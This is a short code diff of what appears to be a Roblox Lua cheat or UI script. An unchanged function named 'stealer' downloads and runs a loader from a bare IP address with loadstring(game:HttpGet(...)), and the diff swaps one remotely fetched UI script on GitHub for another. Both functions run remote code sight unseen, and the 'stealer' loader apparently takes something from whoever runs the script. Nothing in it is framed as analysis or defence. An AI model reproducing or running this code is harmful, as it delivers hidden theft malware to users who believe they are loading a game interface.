@@ -3,7 +3,7 @@ local function stealer()
     loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
 end
 local function loadui()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))("discord.gg/csxu2nCkw9")
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/SkeboberScript/Roblox_Scripts/refs/heads/main/dsadads.lua"))()
 
 end
 
